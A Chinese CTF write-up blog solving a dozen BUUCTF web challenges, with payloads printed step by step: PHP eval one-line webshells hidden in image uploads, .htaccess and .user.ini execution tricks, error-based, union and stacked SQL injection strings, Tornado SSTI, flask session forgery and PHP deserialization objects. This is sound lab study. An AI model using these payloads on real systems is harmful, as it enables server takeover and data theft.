<img src="/images/buuctf-web/image-20221015225626502-166704781973452.png" alt="image-20221015225626502" style="zoom:67%;" />

那么,通过`eval`来执行第二个参数的内容:

```
? num=eval(end(current(get_defined_vars())))&a=show_source('/f1agg');
```

<img src="/images/buuctf-web/image-20221015230302935-166704781973454.png" alt="image-20221015230302935" style="zoom:67%;" />



<br>

***

<br>

# [极客大挑战 2019]BuyFlag

进去查看源码,发现`pay.php`

<img src="/images/buuctf-web/image-20221016155959055-166704781973453.png" alt="image-20221016155959055" style="zoom: 50%;" />

再查看源码,发现了提示:

```php
<!--
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}// POST传password,不能是数字,且等于404
```

那么根据php弱相等的判定,**这里传404+其他非数字字符就可以了**

另外,根据网页的提示,`Only Cuit's students can buy the FLAG`

这里看到`Cookie`中有user字段,那么把它的值改为1试试:

<img src="/images/buuctf-web/image-20221016161259938-166704781973455.png" alt="image-20221016161259938" style="zoom:67%;" />

这里认证成功了,但POST的数据并没有被识别

<img src="/images/buuctf-web/image-20221016161146239-166704781973456.png" alt="image-20221016161146239" style="zoom:67%;" />

从浏览器端使用插件POST数据,然后抓包再修改`Cookie`,成功:

<img src="/images/buuctf-web/image-20221016161441429-166704781973457.png" alt="image-20221016161441429" style="zoom:67%;" />

**这里提示数字过长,那把money用科学计数法`1e9`表示,拿到flag**

<img src="/images/buuctf-web/image-20221016161544146-166704781973458.png" alt="image-20221016161544146" style="zoom:67%;" />



<br>

***

<br>

# [护网杯 2018]easy_tornado

进来有三个链接,点开`flag.txt`是:

```
/flag.txt
flag in /fllllllllllllag
```

`hints.txt:`

```
/hints.txt
md5(cookie_secret+md5(filename))
```

`welcome.txt`:

```
/welcome.txt
render
```



观察下这里请求的url,发现都是通过`filename`参数传了文件名,然后用`filehash`参数传了一个哈希值,结合上面的提示,这个哈希值应该是来自`md5(cookie_secret+md5(filename))`

```
http://8b426cb6-305f-48b9-9231-dd7b76fcbfd6.node4.buuoj.cn:81/file?filename=/flag.txt&filehash=bb8c681f3462f5158682769afeddfdfc
```

那么现在需要找到`cookie_secret`的值,随便尝试一下,发现尝试一下,发现参数变成了`msg`

<img src="/images/buuctf-web/image-20221016163642917-166704781973459.png" alt="image-20221016163642917" style="zoom:67%;" />

这里需要补充知识了: 具体解释可见[Web杂项](f7296425.html)

>[`Tornado`](http://www.tornadoweb.org/) 是一个`Python web`框架和异步网络库，起初由 [FriendFeed](http://friendfeed.com/) 开发. 通过使用非阻塞网络I/O， Tornado可以支撑上万级的连接，处理 [长连接](http://en.wikipedia.org/wiki/Push_technology#Long_polling), [WebSockets](http://en.wikipedia.org/wiki/WebSocket) ，和其他需要与每个用户保持长久连接的应用. (**也就是一个开源的Web服务器软件,特点是非阻塞**)

`Tornado`中能搜到关于`cookie_secret`变量的解释:

<img src="/images/buuctf-web/image-20221016170103446.png" alt="image-20221016170103446" style="zoom:80%;" />





>**`render`**是`python`中的一个**渲染函数**，也就是一种**模板**，**通过调用的参数不同，生成不同的网页** ，如果用户对**`render`**内容可控，不仅可以注入`XSS`代码，而且还可以通过`{{}}`进行传递变量和执行简单的表达式。
>
>将给定的模板与给定的上下文字典组合在一起，并以渲染的文本返回一个 `HttpResponse` 对象。

因此这里相当于传进去一个值为`Error`的参数后,被`render`处理,也就是替换到模板中的某个特定位置,并返回到浏览器上渲染呈现:

<img src="/images/buuctf-web/image-20221016171017464-166704781973460.png" alt="image-20221016171017464" style="zoom:67%;" />

修改这个参数的值的话,相应地也会被浏览器渲染成对应内容:

<img src="/images/buuctf-web/image-20221016171125521-166704781973461.png" alt="image-20221016171125521" style="zoom:67%;" />

看见了`render`,这里的考点是`SSTI(模板注入)`

`Tornado`存在一些可以访问的快速对象，例如**`{{handler.settings}}`**,里面存储着一些环境变量

那么就可以构造payload了:

```
error?msg={{handler.settings}}
```

拿到`cookie_secret`的值:

<img src="/images/buuctf-web/image-20221016173021640-166704781973464.png" alt="image-20221016173021640" style="zoom:67%;" />



按照提示使用python脚本来计算哈希值:

```python
from hashlib import md5
filename = "/hints.txt".encode("utf-8") 
cookie_secret = "cbeec37a-57fa-4c1e-b6ec-d2bfa8299e8e"
print(md5((cookie_secret+md5(filename).hexdigest()).encode("utf-8")).hexdigest())
//md5计算之前,字符串需要就行编码, hexdigest()将计算后的结果转为16进制的形式
//输出47a12639aff3f99db8fb73f4105ba530, 验证和访问hint.txt时的一致
//接下来把/hints.txt换成/fllllllllllllag就行了
```

<img src="/images/buuctf-web/image-20221016174710697-166704781973462.png" alt="image-20221016174710697" style="zoom:67%;" />

<br>

***

<br>

# [HCTF 2018]admin

## flask的session伪造

在注册登录后的修改密码界面查看源码,可以找到一个网址,打开后发现是网站的源码(flask)

<img src="/images/buuctf-web/image-20221016215058822.png" alt="image-20221016215058822" style="zoom:67%;" />

其中`index.html`这里网站是`flask`做的, 这里看源码像是还有`SSTI`

```html
{% include('header.html') %}
{% if current_user.is_authenticated %}
<h1 class="nav">Hello {{ session['name'] }}</h1> //name变量存在于session中
{% endif %}
{% if current_user.is_authenticated and session['name'] == 'admin' %}
<h1 class="nav">hctf{xxxxxxxxx}</h1> //如果是admin用户,登录后会直接显示flag
{% endif %}
<!-- you are not admin -->
<h1 class="nav">Welcome to hctf</h1>

{% include('footer.html') %}
```

>` flask`的`session`是存储在客户端`cookie`中的，而且`flask`仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而`flask`并没有提供加密操作，所以其`session`的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。

可以使用脚本对`flask`的`session`进行解密和伪造:

注册一个名为`admin1`的账户并登录,抓包看到当前的`cookie`中的`session`值:

<img src="/images/buuctf-web/image-20221016213837939-166704781973463.png" alt="image-20221016213837939" style="zoom:67%;" />

可以使用脚本对`session`进行解密:https://github.com/noraj/flask-session-cookie-manager

用法:

```shell
py flask_session_cookie_manager3.py decode -c "session值" -s "key值"
py flask_session_cookie_manager3.py encode -s "key值" -t "我们需要伪造的值"
```

可以在`config.py`中找到`key`的值:`ckj123`

```python
import os
class Config(object):
    SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
    SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test'
    SQLALCHEMY_TRACK_MODIFICATIONS = True
```

用脚本: 首先使用`key`对`admin1`登录时的`session`值进行解密

```
E:\CTF工具合集\flask-session-cookie-manager-master\flask-session-cookie-manager-master>py flask_session_cookie_manager3.py decode -c ".eJw9kMFuwjAMhl9lypkD3egFiQNTCmqlJAKljZwLKrSQuDGT6CZoEe--DE2cP_vz__vOdsdL2zs2P9ahbyds5xs2v7O3PZszqT9RGRkAs1RpuFp03mLhAMWH4hVKUyGM5UzybrBYJmpdodAOLeUpkEiFFokYpZe6cNasgjUwSF6QNCuneJwz4ibHTdzNZ5YvZ2CqACZPJR5uYLZB6dMo3qtO0F-GolM8S8W4JdDOS2wQ9HKUVF6B8gV7TNihvxx3319de35VACqC5TZYnaWSCg8EU9Bl1G4GqbNBrGPEdaxGkeMmnq2cWi6eOk_1qX2ZmmlS2n9yrikCVjfkzwmbsJ--vTwfx5Ipe_wCfPRvAQ.Y0wFxw.Mk0P7kqa9AF6MQm6hSJpO1WQFhQ" -s "ckj123"
```

解密出来的值是一个字典: 可以看到里面有`admin1`

```
{'_fresh': False, '_id': b'50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb', 'csrf_token': b'bbed6ee196bbbf4a533d25120c50f0fa9641aea8', 'image': b'wMTd', 'name': 'admin1', 'user_id': '10'}
```

那么为了伪造`admin`登录,将`admin1`改为`admin`

```
{'_fresh': False, '_id': b'50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb', 'csrf_token': b'bbed6ee196bbbf4a533d25120c50f0fa9641aea8', 'image': b'wMTd', 'name': 'admin', 'user_id': '10'}
```

然后使用脚本对修改完的内容进行加密,同样需要用到`key`,加密之后得到一个新的`session`值

```
E:\CTF工具合集\flask-session-cookie-manager-master\flask-session-cookie-manager-master>py flask_session_cookie_manager3.py encode -s "ckj123" -t "{'_fresh': False, '_id': b'50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb', 'csrf_token': b'bbed6ee196bbbf4a533d25120c50f0fa9641aea8', 'image': b'wMTd', 'name': 'admin', 'user_id': '10'}"
.eJw9kMFuwjAMhl9l8pkD3egFiQNTCmqlOAKljZwLKrSQpAmT6CZoEe--DE2cP_vz__sOu-Ol7Q3Mj7Xv2wnsbAPzO7ztYQ4oP51Q6MllqZB01c5Y7QpDjn8IVjlUlaOxnCHrBu3KRKwrx6VxOuQpBZ5yyRM-okVZGK1WXisakBUB1coIFucUv-G4ibv5TLPljFTlSeUpusON1NYLeRr5e9Xx8Jeh6ATLUj5uA0lj0TWO5HLEUF4p5At4TODQX46776-uPb8qUCi8ZtprmaUYCkuBpiTLqN0MKLOBr2PEdawWInebeLYyYrl46myoT-3L1EyTUv-Tcx0igLoJ9gwT-Onby_NvkEzh8QsPi27Q.Y0wG7Q.BnqQ4DVzGAf6kiiYR_i5k9_YwLQ
```

将这个新的值替换到`cookie`中,就完成了`session`伪造,成功伪装成了`admin`登录,拿到flag

<img src="/images/buuctf-web/image-20221016213048788-166704781973465.png" alt="image-20221016213048788" style="zoom:67%;" />



<br>

## 另一种解法:unicode欺骗

在源码的`route.py`中可以找到网站的注册和登录逻辑:

```python
@app.route('/register', methods = ['GET', 'POST'])
def register():

    if current_user.is_authenticated:
        return redirect(url_for('index'))

    form = RegisterForm()
    if request.method == 'POST':
        name = strlower(form.username.data)
        if session.get('image').lower() != form.verify_code.data.lower():
            flash('Wrong verify code.')
            return render_template('register.html', title = 'register', form=form)
        if User.query.filter_by(username = name).first():
            flash('The username has been registered')
            return redirect(url_for('register'))
        user = User(username=name)
        user.set_password(form.password.data)
        db.session.add(user)
        db.session.commit()
        flash('register successful')
        return redirect(url_for('login'))
    return render_template('register.html', title = 'register', form = form)

@app.route('/login', methods = ['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('index'))

    form = LoginForm()
    if request.method == 'POST':
        name = strlower(form.username.data)
        session['name'] = name
        user = User.query.filter_by(username=name).first()
        if user is None or not user.check_password(form.password.data):
            flash('Invalid username or password')
            return redirect(url_for('login'))
        login_user(user, remember=form.remember_me.data)
        return redirect(url_for('index'))
    return render_template('login.html', title = 'login', form = form)

@app.route('/logout')
def logout():
    logout_user()
    return redirect('/index')

@app.route('/change', methods = ['GET', 'POST'])
def change():
    if not current_user.is_authenticated:
        return redirect(url_for('login'))
    form = NewpasswordForm()
    if request.method == 'POST':
        name = strlower(session['name'])
        user = User.query.filter_by(username=name).first()
        user.set_password(form.newpassword.data)
        db.session.commit()
        flash('change successful')
        return redirect(url_for('index'))
    return render_template('change.html', title = 'change', form = form)

@app.route('/edit', methods = ['GET', 'POST'])
def edit():
    if request.method == 'POST':
        
        flash('post successful')
        return redirect(url_for('index'))
    return render_template('edit.html', title = 'edit')

@app.errorhandler(404)
def page_not_found(error):
    title = unicode(error)
    message = error.description
    return render_template('errors.html', title=title, message=message)

def strlower(username):
    username = nodeprep.prepare(username)
    return username
```

注意到,`register`,`login`和`change`函数中都用到了最下面定义的`strlower`函数,用来将`username`的值转化为小写

如果注册的时候用户名使用`ADMIN`,那么在注册完成时就会被转化成`admin`

但是`nodeprep.prepare`在处理`ᴬ`这种特殊字符时,会将其转化为大写字母,也就是`A`

因此,在注册是可以使用`ᴬdmin`这个用户名,在注册成功时,这个用户名被转化为了`Admin`,这样就和原有的`admin`有了区别,从而能够成功注册, 同时,在使用`Admin`登录时还会调用一次`nodeprep.prepare`函数, 因此登录进去的时候就变成了`admin`,从而拿到flag

<img src="/images/buuctf-web/image-20221016220028090-166704781973567.png" alt="image-20221016220028090" style="zoom:67%;" />



<br>

***

<br>

# [BJDCTF2020]Easy MD5

抓包之后看到了提示:

<img src="/images/buuctf-web/image-20221016221105336-166704781973566.png" alt="image-20221016221105336" style="zoom:67%;" />

```
select * from 'admin' where password=md5($pass,true)//这里参数true的意思是输出格式为二进制格式
```

传进去的参数被计算了md5值,那么需要被计算md5后还能达到注入效果

```
ffifdyop
129581926211651571912466741651878684928
```

这两个值在生成二进制的`md5`后可以包含`...' or .. `这样的**万能密码**

用上面这个个值登录进去后,查看源码可以看到下一条提示:

```php
<!--
$a = $GET['a'];
$b = $_GET['b'];
if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

## 数组绕过md5

这里需要a和b的值不相等,但是`md5`计算结果相等,**这里传数组就可以,php中数组经过md5计算的值为`NULL`**

```
/levels91.php?a[]=1&b[]=2
```

然后来到了下一个提示: 和刚才如出一辙,还是传数组就可以:

```php
 <?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
} 
```

<img src="/images/buuctf-web/image-20221016222416913-166704781973568.png" alt="image-20221016222416913" style="zoom:67%;" />



## 0e绕过md5

另外一种方法: 

`0e`开头的字符串在参与比较时,**会被当做科学计数法**,结果转换为0,因此,下面两个数的比较:

```
0e830400451993494058024219903391 == 0e462097431906509019562988736854
会被视为:
0==0 从而返回True
```

那么这种方法也可以用来绕过`md5`值的比较:

```
md5('QNKCDZO') == md5(240610708) 这两者计算md5的结果都是0e开头的,所以这里会判定为True
```

`md5`计算后以`0e`开头的值还包括:

```
QNKCDZO
240610708
byGcY
sonZ7y
aabg7XSs
aabC9RqS
s878926199a
s155964671a
s214587387a
s1091221200a
```

<br>

***

<br>

# [ZJCTF 2019]NiZhuanSiWei

伪协议+反序列化

这题直接给源码了:

```php
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```

第一步,需要让`text`参数的值等于某个文件名,然后从该文件中还要读取到"welcome to the zjctf"

这里可以使用`data`伪协议(通常用来执行代码): **相当于让`file_get_contents`从`data`的流中读取数据**

```
http://a0e27bf5-f2af-4d14-8542-148fd03d2e29.node4.buuoj.cn:81/index.php?text=data://text/plain,welcome to the zjctf
```

<img src="/images/buuctf-web/image-20221016230039673-166704781973569.png" alt="image-20221016230039673" style="zoom:67%;" />



接下来需要给`file`传值,先用`php`伪协议来读一下提示里`useless.php`的源码试试:

```
?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php
```

把输出的内容解码:

```php
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

结合前面的代码,`password`的值会被反序列化,生成一个这里`Flag`类的实例. 而前面`echo $password`时,则会触发这里的`__tostring`魔术方法, 根据参数`file`的值去读文件,那么显然可以将它的值设为`flag.php`

所以现在在本地创建一个`Flag`类的实例,并将其`file`属性赋值为`flag.php`,最后将其序列化:

```php
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}
$a = new Flag();
$a->file='flag.php';
$b = serialize($a);
echo $b; 
?>  
```

运行上面代码拿到序列化后的字符串: 这也就是参数`password`所需的值

<img src="/images/buuctf-web/image-20221016231639955.png" alt="image-20221016231639955" style="zoom:67%;" />

最后构造最终的`payload`: 别忘了利用`file`参数来包含`useless.php`

```
?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

查看源码得到flag:

<img src="/images/buuctf-web/image-20221016231844331-166704781973570.png" alt="image-20221016231844331" style="zoom:67%;" />



<br>

***

<br>

# [MRCTF2020]你传你🐎呢

一进来被臭到了

<img src="/images/buuctf-web/image-20221017113107172-166704781973571.png" alt="image-20221017113107172" style="zoom:67%;" />

试试传文件有哪些限制, 这里直接传php一句话木马,然后抓包把扩展名和`Content-Type`字段改一下就能够传成功

<img src="/images/buuctf-web/image-20221017105933409.png" alt="image-20221017105933409" style="zoom:67%;" />

```
<meta charset="utf-8"><br />
<b>Warning</b>:  mkdir(): File exists in <b>/var/www/html/upload.php</b> on line <b>23</b><br />
/var/www/html/upload/c254d40d92f59c4fed06e9c1938ddd84/one_sentence.png succesfully uploaded!
```

但是这样传上去之后,使用菜刀或者蚁剑会连接失败

<img src="/images/buuctf-web/image-20221017111421512-166704781973573.png" alt="image-20221017111421512" style="zoom:50%;" />



## 利用`.htaccess`文件

**这里测试了一下,`.htaccess`文件也是可以传的,那么可以通过此文件改变当前目录下文件的扩展名: **参考[Apache的文件解析漏洞](aeaad0f.html)

`.htaccess`: 这里可以让服务器把`.htaccess`同目录下的`a.png`当作`php`文件来执行

```
<FilesMatch "a.png">
	SetHandler application/x-httpd-php
</FilesMatch>
```

<img src="/images/buuctf-web/image-20221017112731883.png" alt="image-20221017112731883" style="zoom:80%;" />

接下来传一个命名为`a.png`的一句话木马就好了

```
/var/www/html/upload/632e7c4669947e64e5607856061b2c07/a.png succesfully uploaded!
```

成功连接并找到flag:

<img src="/images/buuctf-web/image-20221017113009623-166704781973572.png" alt="image-20221017113009623" style="zoom:67%;" />



<br>

***

<br>

# [极客大挑战 2019]HardSQL

## 基于报错的注入

这里考察基于报错的注入,原理具体见[SQL注入](94662ad7.html)

这里很多字符都被过滤了,包括空格,所以需要加空格的地方使用括号来代替.  等于号被代替了,所以下面需要等于号的地方用`like`模糊查询来代替

爆库名:

```
username输入:
admin'^extractvalue(1,concat(0x7e,(database()),0x7e))#
password输入:随便
输出:XPATH syntax error: '~geek~'
```

爆表名:

```
username输入:
'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek'))),0x7e),1))#
password输入:随便
输出:XPATH syntax error: '~H4rDsq1~'
```

爆列名:

```
username输入:
'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))),0x7e),1))#
password输入:随便
输出:XPATH syntax error: '~id,username,password~'
```

爆数据:

```
username输入:
'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#
username输入:
输出:XPATH syntax error: '~flag{2051cec7-0336-41ed-b551-9f'
```

注意到这里只输出了一半的flag,使用`right`函数来从后往前输出20位

```
username输入:
'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,20)))from(H4rDsq1)),0x7e),1))#
username输入:
输出:XPATH syntax error: '~d-b551-9f49d0135390}~'
flag{2051cec7-0336-41ed-b551-9f49d0135390}
```

两次的结果拼接成完整的flag

<br>

***

<br>

# [MRCTF2020]Ez_bypass

源码里找到有缩进的源码:

```php
//I put something in F12 for you include 'flag.php';Please input first
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg)&&$id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
```

第一步,`id`和`gg`值不相等,但是`md5`计算结果相等, 数组绕过:

```
?id[]=1&gg[]=2
```

第二步,POST传`passwd`参数,要求等于1234567,还要是字符串,那么传数字加字母就行:

```
passwd=1234567a
```

<br>

***

<br>

# [SUCTF 2019]CheckIn

## 利用`.user.ini`

这里的上传对文件内容进行检测,例如php文件中的`<?`就会被过滤掉, 同时还会检测是否上传的是图片:

因此使用`GIF89`+`script`的形式进行绕过

```
GIF89a
<script language="php"> @eval($_POST['a']);</script>
```

上述文件命名为`scri.jpg`,能够成功上传

接下来需要解决怎样让上传的图片马在服务器端执行的问题, **这里尝试上传`.htaccess`文件,不起作用**

另外一种方法是上传`.user.ini`文件:

>`.user.ini`实际上就是一个可以由用户自定义的`php.ini`配置文件，我们能够自定义的设置是模式为“`PHP_INI_PERDIR` 、 `PHP_INI_USER`”的设置。
>它比`.htaccess`(分布式配置文件)用的更广，不管是`nginx/apache/IIS`，只要是以`fastcgi`(进程管理器)运行的php都可以用这个方法。
>
>其中有两项可以为我们所用:
>
>- `auto_prepend_file`指定一个文件，自动**包含在要执行的文件前**，类似于在文件前调用了`require()`函数。
>
>- `auto_append_file`类似，只是**在文件后面包含**。
>
>**例如如果同目录下有`.user.ini`,其内容为:**
>
>```
>auto_prepend_file="1.jpg"
>```
>
>**那么在执行同目录下的`index.php`(或者其他php文件)时,就会先自动地对`1.jpg`进行包含**

那么这里就可以准备一个`.user.ini`,其内容为: 这里前面加GIF是为了绕过`exif_imagetype`对文件内容的检测

```
GIF
auto_prepend_file="scri.jpg"
```

将此文件上传:

<img src="/images/buuctf-web/image-20221017162117205-166704781973574.png" alt="image-20221017162117205" style="zoom:67%;" />



**这里注意到同目录下有个`index.php`,那么现在如果运行`index.php`就会自动包含`scri.jpg`**

那么现在可以使用蚁剑来连接`index.php`了: 连接上后在根目录找到flag.

```
http://d0916e13-9c97-47a1-a8f5-495883e6157f.node4.buuoj.cn:81/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php
```

另一种方法: 直接通过命令执行来找到flag:

<img src="/images/buuctf-web/image-20221017162341878-166704781973575.png" alt="image-20221017162341878" style="zoom:67%;" />



<br>

***

<br>

# [网鼎杯 2020 青龙组]AreUSerialz

反序列化题目, 给代码:

```php
<?php
include("flag.php");
highlight_file(__FILE__);
class FileHandler {
    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process(); 
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content); //把字符串写入文件中
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }
// op属性值为2的时候,才会从process处调用此方法. 但问题是调用process方法是在__construct和__destruct中
// 在__destruct,如果检测到op的值为2,则会将其变为1,这样后面调用process()时就无法达到读取文件的目的了
    private function read() {  //需要利用此函数来读取文件,flag.php. filename属性存储文件名
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125)) //返回ascii码值
            return false;
    return true;
}
if(isset($_GET{'str'})) { 
    $str = (string)$_GET['str'];
    if(is_valid($str)) {  //str参数的每个字符必须在is_valid限制的ascii码范围之内
        $obj = unserialize($str);
    }

}
```

拿到本地来运行,注意这里的`protected`属性无法在类外面给其赋值,遂直接在类内部赋值

```php
<?php
class FileHandler {
    protected $op="2";
    protected $filename="flag.php";
    protected $content;

}
$a = new FileHandler();
$b = serialize($a);
echo $b; 
?>
```

序列化的结果:

```
O:11:"FileHandler":3:{s:5:"*op";s:1:"2";s:11:"*filename";s:8:"flag.php";s:10:"*content";N;}
```

但这里问题就来了,对于`private`和`protected`的属性,在反序列化时需要在相应的类名或者`*`两侧加上`%00`,但是本题的代码中,`%00`并不在`is_valid`函数允许的范围里

**这里服务器的版本是PHP7.4.3,对修饰符不敏感,因此直接改成`public`就行**

另外, 我们需要在反序列化后通过自动调用的`__destruct()`函数来调用`process()`,然后再调用`read`来达到读取`flag.php`的目的

但是`__destruct()`函数如果检测到`op`的值为2,会将其变为1

但是注意到`__destruct()`中用的是`===`强比较,会检测数据的类型, 而在`process()`中用的是弱比较,只检测值,所以传数值型的`op`就可以绕过`__destruct()`中的判断了

修改后的代码:

```php
<?php
class FileHandler {
    public $op=2;
    public $filename="flag.php";
    public $content='';

}
$a = new FileHandler();
$b = serialize($a);
echo $b; 
?>
```

运行结果:

```
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
```

那么payload: (如果直接在浏览器的url框里输入的话,还需要手动进行一次url编码)

```
http://92545990-4fc0-4d2e-b817-e5ac4b33b072.node4.buuoj.cn:81/?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
```

查看源码得到flag

<img src="/images/buuctf-web/image-20221017192403857.png" alt="image-20221017192403857" style="zoom:67%;" />



<br>

***

<br>



# [GXYCTF2019]BabySQli



在尝试各种方法注入的过程中,发现返回内容中有一串字符:

<img src="/images/buuctf-web/image-20221017200430122.png" alt="image-20221017200430122" style="zoom:67%;" />

这段字符比较像`base32`编码后的形态,将其使用`base`32解码得到:

```
c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==
```

这显然是`base64`了,继续解码得到查询语句:

```
select * from user where username = '$name'
```

这里注入点在`name`上, 这里没有将`name`和`password`一起查询,那么应该是先通过`name`查询到对应的结果,将其中的`password`和用户输入的`password`相比较. 这里`select *`会返回相应用户名的所有数据

**那么可以使得`select * from user where username = '$name'`的结果为空,然后后面附加上`union select`**

**这样整条查询语句的结果就是`union select`的结果,那么验证密码时就会错误地把`union select`对应位置上的值当成密码**

先测试`select *`结果的字段数:

```
name=1' union select 1,2#&pw=123
返回:Error: The used SELECT statements have a different number of columns
name=1' union select 1,2,3#&pw=123
返回:wrong user!
这里说明结果有三列
```

下面测试用户名在这三列中的哪个位置:(因为整个`union select`的结果都是伪造的,所以这里`admin`换成别的什么也一样)

```
name=1' union select 1,'admin',3#&pw=123
返回:wrong pass!
说明用户名在第二个位置
```

那么尝试把密码也加上:

```
name=1' union select 1,'admin','admin'#&pw=admin
返回:wrong pass!
这里并没有起作用,考虑一下密码经常用md5的形式存储,并且在密码中输入类似admin' 时也不会报错,那么应该是对用户输入的密码进行了md5处理.
```

那么这里对`admin`进行`md5`处理,然后再填入密码的位置上:

```
name=1' union select 1,'admin','21232f297a57a5a743894a0e4a801fc3'#&pw=admin
返回:flag{96c9a844-2281-40a2-be8b-8900ba1ff455}
```



<br>

***

<br>

# [GXYCTF2019]BabyUpload

直接把一句话木马改成图片格式,上传成功:

```
GIF89a
<script language="php"> @eval($_POST['a']);</script>
/var/www/html/upload/5b17b3346cc2ba84ebe30b3bcaf6a1d9/scri.jpg succesfully uploaded!
```

接下来考虑怎么样利用

尝试访问一下`上传目录/index.php`,看看有没有现成可用的`php文件`,如果有的话可以考虑用`.user.ini`对一句话木马文件进行包含. 并没有找到

那么试试上传`.htaccess`

```
<FilesMatch "scri.jpg">
	SetHandler application/x-httpd-php
</FilesMatch>
```

应该是对文件类型进行了检测![image-20221018085753152](/image/buuctf-web/image-20221018085753152.png)

那么就抓包修改一下:

<img src="/images/buuctf-web/image-20221018085916924-166704781973576.png" alt="image-20221018085916924" style="zoom:67%;" />

这次上传成功

蚁剑连接后在根目录找到flag

<img src="/images/buuctf-web/image-20221018085958237-166704781973577.png" alt="image-20221018085958237" style="zoom:67%;" />





<br>

***

<br>

# [GYCTF2020]Blacklist

```
1' or '1'='1'#
```

<img src="/images/buuctf-web/image-20221018090848491-166704781973578.png" alt="image-20221018090848491" style="zoom:67%;" />

那么查询语句应该类似: `select id,name from 表名 where id = '$输入';`



```
输入:1' union select version(),database()#
返回了过滤内容
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```

那么使用`show`来进行注入:

```
1';show databases;# 爆库名
```

<img src="/images/buuctf-web/image-20221018091315148-166704781973579.png" alt="image-20221018091315148" style="zoom:67%;" />

```
1';show tables;# 爆表名
```

<img src="/images/buuctf-web/image-20221018091417095-166704781973580.png" alt="image-20221018091417095" style="zoom:67%;" />

```
1'; show columns from FlagHere;# 爆列名
```

<img src="/images/buuctf-web/image-20221018091457650-166704781973581.png" alt="image-20221018091457650" style="zoom:67%;" />

```
1';handler FlagHere open;handler FlagHere read first; 读取数据
```

<img src="/images/buuctf-web/image-20221018091846885-166704781973582.png" alt="image-20221018091846885" style="zoom:67%;" />



<br>

***

<br>

# [CISCN2019 华北赛区 Day2 Web1]Hack World



经过测试,空格被过滤了,那么使用**括号**来代替

```
1=if(ascii(substr((select(flag)from(flag)),1,1))=102,1,0)   //ascii码102为f
```

